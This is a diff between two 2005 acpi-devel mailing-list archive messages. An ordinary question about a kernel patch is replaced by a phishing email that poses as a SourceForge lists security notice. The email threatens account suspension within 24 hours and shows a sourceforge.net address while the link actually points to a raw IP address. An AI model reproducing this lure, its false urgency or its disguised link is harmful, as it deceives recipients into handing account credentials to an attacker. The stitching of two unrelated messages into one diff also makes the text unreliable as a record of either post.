@@ -1,11 +1,10 @@
-From: Laura Thurber <rose_bud4201-/E1597aS9LQAvxtiuMwx3w@public.gmane.org>
-Subject: Patch for 2.4.26?
-Date: Mon, 6 Jun 2005 13:02:45 -0700 (PDT)
-Message-ID: <20050606200245.13334.qmail@web31713.mail.mud.yahoo.com>
-Reply-To: lthurber-Rn4VEauK+AKRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
+From: support-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
+Subject: Notice: **Last Warning**
+Date: Mon, 6 Jun 2005 13:47:07 -0700
+Message-ID: <200506062051.j56Kpk3E014993@de01smr02.am.mot.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
-Content-Transfer-Encoding: quoted-printable
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0003_D5A02384.B6E522CD"
 Return-path: <acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 Sender: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 Errors-To: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
@@ -19,28 +18,35 @@ List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=acpi-devel>
 To: acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-acpi@vger.kernel.org
 
-Hi all,
-  According to the archives here, there was at one
-point a patch for 2.4.26.  However, the last version
-on the download server is 2.4.27.  Does someone have a
-working URL for .26, or will the .27 patch do as well?
-  Much appreciated,
-  -Laura
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0003_D5A02384.B6E522CD
+Content-Type: text/html;
+	charset="ISO-8859-1"
+Content-Transfer-Encoding: 7bit
+
+
+<html> 
+<body> 
+<BR><STRONG>Dear Valued Member, </STRONG><BR> 
+<BR>According to our site policy you will have to confirm your account by the following link or else your account will be suspended within 24 hours for security reasons.<BR> 
+<BR><a href="http://209.67.220.164/confirm.php?email=acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org">http://www.lists.sourceforge.net/confirm.php?email=acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org</a><BR> 
+<BR>Thank you for your attention to this question. We apologize for any inconvenience.<BR> 
+<BR>Sincerely,Lists Security Department Assistant.<BR> 
+</body> 
+</html> 
 
 
 
-	=09
-__________________________________=20
-Discover Yahoo!=20
-Have fun online with music videos, cool games, IM and more. Check it out!=
-=20
-http://discover.yahoo.com/online.html
+
+
+------=_NextPart_000_0003_D5A02384.B6E522CD--
+
+
 
 
 -------------------------------------------------------
-This SF.Net email is sponsored by: NEC IT Guy Games.  How far can you sho=
-tput
-a projector? How fast can you ride your desk chair down the office luge t=
-rack?
-If you want to score the big prize, get to know the little guy. =20
-Play to win an NEC 61" plasma display: http://www.necitguy.com/?r=3D20
+This SF.Net email is sponsored by: NEC IT Guy Games.  How far can you shotput
+a projector? How fast can you ride your desk chair down the office luge track?
+If you want to score the big prize, get to know the little guy.  
+Play to win an NEC 61" plasma display: http://www.necitguy.com/?r=20
